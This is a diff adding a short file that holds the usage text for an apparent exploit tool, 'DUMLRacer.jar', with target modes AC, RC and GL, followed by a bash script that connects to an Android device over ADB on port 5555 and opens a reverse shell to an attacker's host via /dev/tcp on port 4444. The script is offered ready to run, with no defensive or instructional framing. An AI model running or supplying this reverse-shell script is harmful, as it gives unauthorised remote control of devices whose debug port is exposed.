@@ -1,0 +1,21 @@
+Usage:
+    private static void printHelp() {
+        System.out.println("java -jar DUMLRacer.jar <mode>");
+        System.out.println("Modes:");
+        System.out.println("AC - target AC");
+        System.out.println("RC - target RC");
+        System.out.println("GL - target GL");
+    }
+
+
+java -jar DUMLRacer.jar AC
+
+
+-----------------------
+#!/bin/bash
+# Simple reverse shell on android devie using Android Debug Bridge ensure you run nc -lvp 4444 on another screen first.
+# By Random_Robbie 
+adb connect $1:5555
+adb shell sh -i >& /dev/tcp/$2/4444 0>&1
+echo "[*] Should have a shell now ..... Be nice :) [*]"
+-----------------------
